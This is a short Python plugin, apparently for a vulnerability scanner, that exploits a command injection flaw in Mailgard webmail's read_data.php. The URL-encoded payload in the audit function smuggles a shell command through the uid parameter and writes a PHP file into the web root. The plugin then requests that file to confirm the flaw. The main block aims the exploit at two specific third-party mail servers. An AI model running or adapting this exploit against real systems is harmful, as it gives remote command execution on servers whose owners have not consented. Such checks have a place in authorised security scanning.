#!/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0104770
#__Author__ = 默雨
#_PlugName_ = mailgard webmail Plugin


def assign(service, arg):
    if service == "mailgard-webmail":
        return True, arg    

def audit(arg):
    url = arg
    payload = "src%2fread_data.php%3fsd%3dxxx%26uid%3d+%26+echo+%27%3c%3fphp+echo+testvul+%3b%3f%3e%27+%3e+%2fvar%2fwww%2fnewmail%2ftestvul.php+%26+%26action%3dzzz%26file_name%3d%26user%3dtest%40123.com"
    code1, head1, res1, errcode1, _url1 = curl.curl2(url+payload)
    code2, head2, res2, errcode2, _url2 = curl.curl2(url+"testvul.php")
    if code2 == 200 and 'testvul' in res2: 
        security_hole(url+payload)
              
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('mailgard-webmail', 'http://mail.szbestman.com:889/')[1])
    audit(assign('mailgard-webmail', 'http://mail.jinsunway.com:889/')[1])